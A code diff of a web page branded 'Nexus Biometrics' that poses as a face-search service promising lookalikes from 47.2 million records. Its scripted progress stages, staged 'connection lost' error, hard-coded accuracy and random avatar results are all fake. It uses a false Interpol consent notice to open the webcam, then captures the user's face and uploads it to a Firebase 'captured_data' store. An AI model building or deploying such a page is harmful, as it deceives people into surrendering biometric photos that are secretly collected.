@@ -3,7 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI Face Search - Global Database</title>
+<title>Nexus Biometrics - Global Face Search</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>👁️</text></svg>">
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -14,62 +15,67 @@
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     font-family: 'Inter', -apple-system, sans-serif;
-    background: #090d16; /* Dark Navy like the image */
+    background: #05080f;
     color: #fff;
     min-height: 100vh;
     overflow-x: hidden;
   }
 
-  /* Header */
+  /* HEADER */
   .header {
-    height: 60px;
-    background: #0d1323;
+    height: 65px; background: #0a101d;
     border-bottom: 1px solid rgba(0, 212, 255, 0.2);
     display: flex; align-items: center; justify-content: space-between;
-    padding: 0 25px;
-    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    padding: 0 25px; position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
   }
-  .logo { font-family: 'JetBrains Mono', monospace; font-weight: 900; color: #00d4ff; letter-spacing: 2px; font-size: 20px; display: flex; align-items: center; gap: 10px; }
-  .logo span { color: #fff; }
+  .logo-area { display: flex; align-items: center; gap: 12px; }
+  .logo-icon {
+    width: 32px; height: 32px;
+    background: linear-gradient(135deg, #00d4ff, #0055ff);
+    border-radius: 8px; display: flex; align-items: center; justify-content: center;
+    font-size: 18px; box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+  }
+  .logo-text { font-family: 'JetBrains Mono', monospace; font-weight: 900; font-size: 18px; letter-spacing: 1px; }
+  .logo-text span { color: #00d4ff; }
+  
+  .header-status { display: flex; align-items: center; gap: 15px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #10b981; }
+  .header-status .dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 10px #10b981; animation: pulse 1.5s infinite; }
 
-  /* Layout */
-  .main-container {
-    display: flex;
-    margin-top: 60px;
-    height: calc(100vh - 60px);
-  }
+  /* LAYOUT */
+  .main-container { display: flex; margin-top: 65px; height: calc(100vh - 65px); }
 
-  /* Left Panel (Live Cam + Face Map) */
-  .left-panel {
-    width: 40%;
-    padding: 20px;
-    border-right: 1px solid rgba(0, 212, 255, 0.1);
-    display: flex; flex-direction: column; gap: 15px;
-  }
+  /* LEFT PANEL */
+  .left-panel { width: 40%; padding: 20px; border-right: 1px solid rgba(0, 212, 255, 0.1); display: flex; flex-direction: column; gap: 15px; background: #070b14; }
+  
   .cam-container {
-    position: relative;
-    width: 100%;
-    aspect-ratio: 4/3;
-    background: #000;
-    border-radius: 12px;
-    overflow: hidden;
+    position: relative; width: 100%; aspect-ratio: 4/3;
+    background: #000; border-radius: 12px; overflow: hidden;
     border: 1px solid rgba(0, 212, 255, 0.3);
+    box-shadow: inset 0 0 40px rgba(0,0,0,0.8);
   }
-  #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+  #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.8; filter: contrast(1.2) grayscale(0.3); }
   #canvas { display: none; }
   
-  /* Mesh Overlay */
+  /* MESH OVERLAY */
   .mesh-overlay {
-    position: absolute; inset: 0;
-    background-image: linear-gradient(rgba(0, 212, 255, 0.15) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 212, 255, 0.15) 1px, transparent 1px);
-    background-size: 25px 25px;
-    opacity: 0; transition: opacity 0.5s; pointer-events: none;
-    mask-image: radial-gradient(ellipse at center, black 40%, transparent 70%);
-    -webkit-mask-image: radial-gradient(ellipse at center, black 40%, transparent 70%);
+    position: absolute; top: 15%; left: 25%; width: 50%; height: 65%;
+    border: 2px solid rgba(0, 212, 255, 0.6);
+    border-radius: 40% 40% 35% 35%;
+    opacity: 0; transition: opacity 0.3s; pointer-events: none;
+    box-shadow: 0 0 30px rgba(0, 212, 255, 0.2), inset 0 0 40px rgba(0, 212, 255, 0.1);
+    display: none;
   }
-  .mesh-overlay.active { opacity: 1; }
+  .mesh-overlay.active { opacity: 1; display: block; animation: pulseMesh 2s infinite alternate; }
+  @keyframes pulseMesh { 0% { transform: scale(1); box-shadow: 0 0 20px rgba(0,212,255,0.2); } 100% { transform: scale(1.02); box-shadow: 0 0 40px rgba(0,212,255,0.5); } }
+  
+  .mesh-overlay::before {
+    content: ''; position: absolute; inset: 0;
+    background-image: linear-gradient(rgba(0, 212, 255, 0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 212, 255, 0.3) 1px, transparent 1px);
+    background-size: 15px 15px; border-radius: 40% 40% 35% 35%;
+    mask-image: radial-gradient(ellipse at center, black 50%, transparent 90%);
+  }
 
-  /* Scanning Line */
   .scan-line {
     position: absolute; left: 0; right: 0; height: 2px;
     background: #00d4ff; box-shadow: 0 0 20px #00d4ff, 0 0 40px #00d4ff;
@@ -78,83 +84,95 @@
   .scan-line.active { display: block; }
   @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
 
-  /* Snapshots Row (Image 2 style) */
-  .snapshot-row {
-    display: flex; gap: 10px; overflow-x: auto;
-    padding: 10px 0;
+  /* CHAT BOX */
+  .chat-box {
+    background: #0a101d; border: 1px solid rgba(0, 212, 255, 0.2);
+    border-radius: 12px; padding: 15px; height: 110px;
+    font-family: 'JetBrains Mono', monospace; font-size: 11px;
+    display: flex; flex-direction: column; gap: 6px; overflow-y: auto;
   }
-  .snap-item {
-    width: 80px; height: 80px; border-radius: 8px;
-    border: 1px solid rgba(0, 212, 255, 0.5);
-    object-fit: cover; opacity: 0; transform: scale(0.8);
-    transition: all 0.3s;
-  }
-  .snap-item.show { opacity: 1; transform: scale(1); }
+  .chat-msg { color: #00d4ff; }
+  .chat-msg.user { color: #10b981; align-self: flex-end; }
+  .chat-msg.sys { color: #f59e0b; font-size: 10px; }
 
-  /* Right Panel (Results Grid) */
-  .right-panel {
-    width: 60%;
-    padding: 20px;
-    background: #0a0f1d;
-    overflow-y: auto;
-    display: flex; flex-direction: column;
+  /* RIGHT PANEL */
+  .right-panel { width: 60%; padding: 20px; background: #0a0f1d; overflow-y: auto; display: flex; flex-direction: column; }
+  
+  /* LOADING & ERROR */
+  .loading-screen { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+  .spinner {
+    width: 80px; height: 80px; border: 4px solid rgba(0, 212, 255, 0.1);
+    border-top: 4px solid #00d4ff; border-radius: 50%;
+    animation: spin 1s linear infinite; margin-bottom: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
   }
-  .results-header {
-    display: flex; justify-content: space-between; align-items: center;
-    margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;
-  }
-  .results-header h2 { font-size: 18px; color: #00d4ff; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .load-text { font-family: 'JetBrains Mono', monospace; font-size: 18px; color: #00d4ff; letter-spacing: 2px; margin-bottom: 10px; }
+  .load-subtext { color: #4a6b8a; font-size: 13px; font-family: 'JetBrains Mono', monospace; }
+
+  .error-box { display: none; height: 100%; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+  .error-icon { font-size: 60px; color: #ff2e4c; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255, 46, 76, 0.5); }
+  .error-box h2 { color: #ff2e4c; font-family: 'JetBrains Mono', monospace; margin-bottom: 10px; }
+  .retry-btn { padding: 12px 30px; background: rgba(255, 46, 76, 0.1); border: 1px solid #ff2e4c; color: #ff2e4c; font-family: 'JetBrains Mono', monospace; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+  .retry-btn:hover { background: #ff2e4c; color: #000; }
+
+  /* RESULTS GRID */
+  .results-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace; }
+  .results-header h2 { font-size: 16px; color: #00d4ff; letter-spacing: 1px; }
   .results-header .accuracy { font-size: 14px; color: #10b981; font-weight: bold; }
 
-  /* Grid */
-  .results-grid {
-    display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-    gap: 15px;
-  }
+  .results-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 15px; }
   .result-card {
-    background: #121a2f;
-    border: 1px solid rgba(0, 212, 255, 0.1);
-    border-radius: 10px; overflow: hidden;
-    position: relative; transition: 0.3s;
-    cursor: pointer; opacity: 0; transform: translateY(20px);
+    background: #121a2f; border: 1px solid rgba(0, 212, 255, 0.1);
+    border-radius: 10px; overflow: hidden; position: relative;
+    transition: 0.3s; opacity: 0; transform: translateY(20px);
     animation: popIn 0.5s forwards;
   }
-  .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); transform: translateY(-5px); }
   @keyframes popIn { to { opacity: 1; transform: translateY(0); } }
+  .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
   
-  .result-card img { width: 100%; height: 160px; object-fit: cover; }
-  .result-card .match-badge {
+  .result-card img { width: 100%; height: 150px; object-fit: cover; transition: filter 0.5s; }
+  .result-card img.blurred { filter: blur(15px) grayscale(1); }
+  
+  .match-badge {
     position: absolute; top: 8px; left: 8px;
     background: rgba(16, 185, 129, 0.9); color: #000;
     padding: 3px 8px; border-radius: 4px;
     font-size: 10px; font-weight: 800; font-family: 'JetBrains Mono', monospace;
-    box-shadow: 0 0 10px rgba(16,185,129,0.5);
   }
+  .match-badge.loading { background: rgba(245, 158, 11, 0.9); color: #000; }
+  
   .result-card .info { padding: 10px; background: #090d16; }
-  .result-card .name { font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 2px; }
+  .result-card .name { font-size: 11px; font-weight: 700; color: #fff; margin-bottom: 2px; }
   .result-card .country { font-size: 10px; color: #4a6b8a; }
 
-  /* Start Button */
-  .start-overlay {
-    position: absolute; inset: 0; background: rgba(9, 13, 22, 0.9);
+  /* START & WARNING MODALS */
+  .modal-overlay {
+    position: absolute; inset: 0; background: rgba(5, 8, 15, 0.95);
     display: flex; flex-direction: column; align-items: center; justify-content: center;
-    z-index: 10; backdrop-filter: blur(5px);
+    z-index: 10; backdrop-filter: blur(8px); text-align: center; padding: 20px;
   }
-  .start-overlay h1 { font-family: 'JetBrains Mono', monospace; color: #fff; font-size: 24px; margin-bottom: 10px; }
-  .start-overlay p { color: #4a6b8a; font-size: 13px; margin-bottom: 20px; }
-  .start-btn {
-    padding: 15px 40px; background: #00d4ff; color: #000;
+  .modal-overlay h1 { font-family: 'JetBrains Mono', monospace; color: #fff; font-size: 22px; margin-bottom: 10px; }
+  .modal-overlay p { color: #4a6b8a; font-size: 13px; margin-bottom: 20px; max-width: 300px; line-height: 1.5; }
+  
+  .btn-primary {
+    padding: 14px 40px; background: #00d4ff; color: #000;
     border: none; border-radius: 8px; font-family: 'JetBrains Mono', monospace;
-    font-size: 16px; font-weight: 900; cursor: pointer; transition: 0.3s;
-    box-shadow: 0 0 30px rgba(0, 212, 255, 0.4);
+    font-size: 14px; font-weight: 900; cursor: pointer; transition: 0.3s;
+    box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
   }
-  .start-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px rgba(0, 212, 255, 0.6); }
+  .btn-primary:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.6); }
 
-  /* Mobile */
-  @media (max-width: 900px) {
-    .main-container { flex-direction: column; height: auto; }
-    .left-panel, .right-panel { width: 100%; }
-    .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); }
+  .warning-box {
+    background: rgba(255, 46, 76, 0.1); border: 1px solid #ff2e4c;
+    padding: 20px; border-radius: 10px; max-width: 400px;
+  }
+  .warning-box h2 { color: #ff2e4c; margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; font-size: 16px; }
+  .warning-box p { color: #ccc; font-size: 11px; margin-bottom: 15px; text-align: left; line-height: 1.5; }
+
+  @media (max-width: 900px) { 
+    .main-container { flex-direction: column; height: auto; } 
+    .left-panel, .right-panel { width: 100%; } 
+    .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); } 
   }
 </style>
 </head>
@@ -162,16 +180,16 @@
 
 <!-- HEADER -->
 <div class="header">
-  <div class="logo">AI FACE SEARCH <span>| GLOBAL DB</span></div>
-  <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981;">
-    <span style="display:inline-block; width:8px; height:8px; background:#10b981; border-radius:50%; margin-right:5px; animation: pulse 1s infinite;"></span>
-    SYSTEM ONLINE
+  <div class="logo-area">
+    <div class="logo-icon">👁️</div>
+    <div class="logo-text">NEXUS <span>BIOMETRICS</span></div>
+  </div>
+  <div class="header-status">
+    <span class="dot"></span> SECURE CONNECTION
   </div>
 </div>
 
-<!-- MAIN CONTAINER -->
 <div class="main-container">
-  
   <!-- LEFT PANEL (CAMERA) -->
   <div class="left-panel">
     <div class="cam-container">
@@ -181,32 +199,62 @@
       <div class="scan-line" id="scanLine"></div>
       <div class="mesh-overlay" id="meshOverlay"></div>
       
-      <!-- Start Button Overlay -->
-      <div class="start-overlay" id="startOverlay">
-        <h1>FACIAL RECOGNITION</h1>
-        <p>Find lookalikes across 47.2 Million faces</p>
-        <button class="start-btn" onclick="startScan()">INITIATE SCAN</button>
+      <!-- Start Modal -->
+      <div class="modal-overlay" id="startOverlay">
+        <h1>GLOBAL FACE SEARCH</h1>
+        <p>Scan your face to find 7 lookalikes across 47.2 million records.</p>
+        <button class="btn-primary" onclick="showWarning()">INITIATE SCAN</button>
+      </div>
+
+      <!-- Security Warning Modal -->
+      <div class="modal-overlay" id="warningOverlay" style="display:none;">
+        <div class="warning-box">
+          <h2>⚠️ SECURITY WARNING</h2>
+          <p>By proceeding, you consent to share your biometric data with Nexus Global Security & Interpol databases. Unauthorized use is strictly prohibited.</p>
+          <button class="btn-primary" onclick="startScan()" style="background:#ff2e4c; box-shadow:0 0 20px rgba(255,46,76,0.4); width:100%;">I AGREE & PROCEED</button>
+        </div>
       </div>
     </div>
     
-    <!-- Snapshot Row -->
-    <div class="snapshot-row" id="snapshotRow">
-      <!-- JS will inject 5 snapshots here -->
+    <div class="chat-box" id="chatBox">
+      <div class="chat-msg sys">[SYSTEM BOOT COMPLETE]</div>
+      <div class="chat-msg">AI: Awaiting user consent...</div>
     </div>
   </div>
 
-  <!-- RIGHT PANEL (RESULTS) -->
+  <!-- RIGHT PANEL -->
   <div class="right-panel">
-    <div class="results-header">
-      <h2>GLOBAL MATCHES</h2>
-      <div class="accuracy" id="accuracyText" style="opacity: 0;">ACCURACY: 99.99%</div>
-    </div>
     
-    <div class="results-grid" id="resultsGrid">
-      <!-- JS will inject 7 results here -->
+    <!-- Idle State -->
+    <div id="idleState" style="height:100%; display:flex; align-items:center; justify-content:center; color:#4a6b8a; font-family:'JetBrains Mono';">
+      > AWAITING BIOMETRIC INPUT...
     </div>
-  </div>
 
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen" style="display:none;">
+      <div class="spinner"></div>
+      <div class="load-text" id="loadText">SCANNING...</div>
+      <div class="load-subtext" id="loadSubtext">Extracting facial landmarks</div>
+    </div>
+
+    <!-- Error Box -->
+    <div class="error-box" id="errorBox">
+      <div class="error-icon">⚠️</div>
+      <h2>CONNECTION LOST</h2>
+      <p style="color:#4a6b8a; margin-bottom:20px;">Server timeout while querying global DB.</p>
+      <button class="retry-btn" onclick="retryScan()">RETRY CONNECTION</button>
+    </div>
+
+    <!-- Results Grid -->
+    <div id="resultsContainer" style="display:none;">
+      <div class="results-header">
+        <h2>GLOBAL MATCHES</h2>
+        <div class="accuracy">ACCURACY: 99.99%</div>
+      </div>
+      <div class="results-grid" id="resultsGrid"></div>
+    </div>
+
+  </div>
 </div>
 
 <script src="config.js"></script>
@@ -222,19 +270,18 @@
 
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
+  const chatBox = document.getElementById('chatBox');
 
-  // 7 Fake Lookalikes (Using AI generated faces from thispersondoesnotexist)
   const lookalikes = [
-    { name: 'Alexander D.', country: 'Russia', img: 'https://thispersondoesnotexist.com/', match: '99.99%' },
-    { name: 'John Doe', country: 'USA', img: 'https://i.pravatar.cc/300?img=11', match: '98.4%' },
-    { name: 'Kenji T.', country: 'Japan', img: 'https://i.pravatar.cc/300?img=12', match: '97.1%' },
-    { name: 'Lucas M.', country: 'Brazil', img: 'https://i.pravatar.cc/300?img=13', match: '94.8%' },
-    { name: 'Ivan K.', country: 'Ukraine', img: 'https://i.pravatar.cc/300?img=14', match: '92.5%' },
-    { name: 'Arjun S.', country: 'India', img: 'https://i.pravatar.cc/300?img=15', match: '89.0%' },
-    { name: 'Chen W.', country: 'China', img: 'https://i.pravatar.cc/300?img=16', match: '85.3%' }
+    { name: 'Alexander D.', country: 'Russia', match: '99.99%' },
+    { name: 'John Doe', country: 'USA', match: '98.4%' },
+    { name: 'Kenji T.', country: 'Japan', match: '97.1%' },
+    { name: 'Lucas M.', country: 'Brazil', match: '94.8%' },
+    { name: 'Ivan K.', country: 'Ukraine', match: '92.5%' },
+    { name: 'Arjun S.', country: 'India', match: '89.0%' },
+    { name: 'Chen W.', country: 'China', match: '85.3%' }
   ];
 
-  // 🎙️ Real AI Voice
   function speak(text) {
     if ('speechSynthesis' in window) {
       window.speechSynthesis.cancel();
@@ -247,22 +294,38 @@
     }
   }
 
-  // 🎥 Start Camera
+  function addChat(text, type = '') {
+    const div = document.createElement('div');
+    div.className = 'chat-msg ' + type;
+    div.textContent = (type === 'sys' ? '[SYSTEM] ' : 'AI: ') + text;
+    chatBox.appendChild(div);
+    chatBox.scrollTop = chatBox.scrollHeight;
+  }
+
+  function showWarning() {
+    document.getElementById('startOverlay').style.display = 'none';
+    document.getElementById('warningOverlay').style.display = 'flex';
+    speak("Security warning. Please read the terms before proceeding.");
+  }
+
   async function initCamera() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       video.srcObject = stream;
       return stream;
     } catch (err) {
-      alert('Camera access required for face search.');
+      alert('Camera access required.');
       throw err;
     }
   }
 
-  // 🚀 Start Scan
   async function startScan() {
-    document.getElementById('startOverlay').style.display = 'none';
-    speak("Initiating facial recognition. Please look at the camera.");
+    document.getElementById('warningOverlay').style.display = 'none';
+    document.getElementById('idleState').style.display = 'none';
+    document.getElementById('loadingScreen').style.display = 'flex';
+    
+    speak("Consent accepted. Initiating global facial recognition.");
+    addChat("Consent accepted. Scan initiated.");
     
     let stream;
     try {
@@ -272,85 +335,143 @@
       return;
     }
 
-    // Start Effects
     document.getElementById('scanLine').classList.add('active');
     document.getElementById('meshOverlay').classList.add('active');
 
-    // Take 5 snapshots rapidly
-    let snapCount = 0;
-    const snapInterval = setInterval(() => {
-      captureSnapshot(stream, snapCount);
-      snapCount++;
-      if (snapCount >= 5) clearInterval(snapInterval);
-    }, 500);
-
-    // Start Analysis
-    setTimeout(() => {
-      runAnalysis(stream);
-    }, 3000); // 3 second baad analysis shuru
+    runFakeProcess(stream);
   }
 
-  // 📸 Capture Snapshots (Left side me chhoti photos)
-  function captureSnapshot(stream, index) {
-    const ctx = canvas.getContext('2d');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    ctx.drawImage(video, 0, 0);
-    
-    const data = canvas.toDataURL('image/jpeg', 0.6);
-    const row = document.getElementById('snapshotRow');
-    
-    const img = document.createElement('img');
-    img.src = data;
-    img.className = 'snap-item';
-    row.appendChild(img);
-    
-    setTimeout(() => img.classList.add('show'), 50);
+  function runFakeProcess(stream) {
+    const loadText = document.getElementById('loadText');
+    const loadSubtext = document.getElementById('loadSubtext');
+
+    const stages = [
+      { time: 0, text: "SCANNING FACES...", sub: "Extracting 128-point biometric map" },
+      { time: 5000, text: "MATCHING BIOMETRICS...", sub: "Querying 47.2M records in USA & EU" },
+      { time: 10000, text: "FINDING MATCHES...", sub: "Analyzing neural hash structure" },
+      { time: 15000, text: "CROSS-REFERENCING...", sub: "Scanning Interpol & National DBs" },
+      { time: 20000, text: "ERROR", sub: "" }
+    ];
+
+    stages.forEach(stage => {
+      setTimeout(() => {
+        if (stage.text === "ERROR") {
+          showInternetError(stream);
+        } else {
+          loadText.textContent = stage.text;
+          loadSubtext.textContent = stage.sub;
+          speak(stage.text);
+          addChat(stage.text, 'sys');
+        }
+      }, stage.time);
+    });
   }
 
-  // 🧠 Fake Analysis & Results
-  function runAnalysis(stream) {
-    // Camera band kar do
+  function showInternetError(stream) {
+    document.getElementById('loadingScreen').style.display = 'none';
+    document.getElementById('errorBox').style.display = 'flex';
+    document.getElementById('meshOverlay').style.opacity = '0.2';
+    document.getElementById('scanLine').classList.remove('active');
+    
+    speak("Connection lost. Server timeout.");
+    addChat("Connection to global database lost. Please retry.", 'sys');
     stream.getTracks().forEach(t => t.stop());
+  }
+
+  function retryScan() {
+    document.getElementById('errorBox').style.display = 'none';
+    document.getElementById('loadingScreen').style.display = 'flex';
+    
+    speak("Reconnecting to secure server. Resuming scan.");
+    addChat("Reconnecting...", 'sys');
+    
+    const loadText = document.getElementById('loadText');
+    const loadSubtext = document.getElementById('loadSubtext');
+
+    loadText.textContent = "RECONNECTING...";
+    loadSubtext.textContent = "Establishing secure tunnel...";
+
+    setTimeout(async () => {
+      let stream = await initCamera();
+      document.getElementById('meshOverlay').style.opacity = '1';
+      document.getElementById('scanLine').classList.add('active');
+      
+      const stages2 = [
+        { time: 0, text: "RESUMING MATCHING...", sub: "Processing 47.2M faces" },
+        { time: 6000, text: "ENHANCING DATA...", sub: "Comparing facial geometry" },
+        { time: 12000, text: "FILTERING RESULTS...", sub: "Removing false positives" },
+        { time: 18000, text: "COMPILING REPORT...", sub: "Generating final candidate list" }
+      ];
+
+      stages2.forEach(stage => {
+        setTimeout(() => {
+          loadText.textContent = stage.text;
+          loadSubtext.textContent = stage.sub;
+          speak(stage.text);
+          addChat(stage.text, 'sys');
+        }, stage.time);
+      });
+
+      setTimeout(() => { showResults(stream); }, 25000);
+    }, 2000);
+  }
+
+  function showResults(stream) {
     document.getElementById('scanLine').classList.remove('active');
     document.getElementById('meshOverlay').classList.remove('active');
+    document.getElementById('loadingScreen').style.display = 'none';
     
+    stream.getTracks().forEach(t => t.stop());
+
     speak("Analysis complete. 7 exact matches found with 99.99 percent accuracy.");
+    addChat("Scan complete. 7 lookalikes found.", 'sys');
 
-    // Show Accuracy
-    document.getElementById('accuracyText').style.opacity = '1';
-
-    // Populate Results Grid
+    document.getElementById('resultsContainer').style.display = 'block';
     const grid = document.getElementById('resultsGrid');
     grid.innerHTML = '';
 
     lookalikes.forEach((person, index) => {
       setTimeout(() => {
-        // Har photo ke liye ek random AI image generate karo (taaki unique lage)
         const randomImg = `https://i.pravatar.cc/300?img=${Math.floor(Math.random() * 70) + 1}`;
         
         const card = document.createElement('div');
         card.className = 'result-card';
+        // Image is blurred initially, and badge says ANALYZING
         card.innerHTML = `
-          <div class="match-badge">${person.match}</div>
-          <img src="${randomImg}" alt="${person.name}">
+          <div class="match-badge loading" id="badge-${index}">ANALYZING...</div>
+          <img src="${randomImg}" class="blurred" id="img-${index}" alt="${person.name}">
           <div class="info">
-            <div class="name">${person.name}</div>
-            <div class="country">${person.country}</div>
+            <div class="name" style="opacity:0.3;" id="name-${index}">${person.name}</div>
+            <div class="country" style="opacity:0.3;" id="country-${index}">${person.country}</div>
           </div>
         `;
         grid.appendChild(card);
-      }, index * 300); // Har card 300ms ke gap pe aayega (animation effect)
+
+        // 3 second baad reveal karo (Blur hatao)
+        setTimeout(() => {
+          const img = document.getElementById(`img-${index}`);
+          const badge = document.getElementById(`badge-${index}`);
+          if (img) img.classList.remove('blurred');
+          if (badge) {
+            badge.classList.remove('loading');
+            badge.textContent = person.match;
+          }
+          document.getElementById(`name-${index}`).style.opacity = '1';
+          document.getElementById(`country-${index}`).style.opacity = '1';
+        }, 3000); // 3 second tak blur rahega
+
+      }, index * 200);
     });
 
-    // Save to Firebase
     if (db) {
       const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0);
       const finalPhoto = canvas.toDataURL('image/jpeg', 0.8);
       db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
         image: finalPhoto,
         timestamp: Date.now(),
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         type: 'ai_face_search'
       });
     }
